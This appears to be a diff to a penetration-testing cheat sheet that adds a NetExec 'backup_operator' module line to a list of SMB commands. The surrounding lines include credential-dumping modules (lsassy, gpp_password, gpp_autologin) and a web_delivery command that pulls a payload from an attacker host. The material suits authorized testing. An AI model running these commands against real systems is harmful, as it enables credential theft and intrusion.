@@ -706,6 +706,7 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
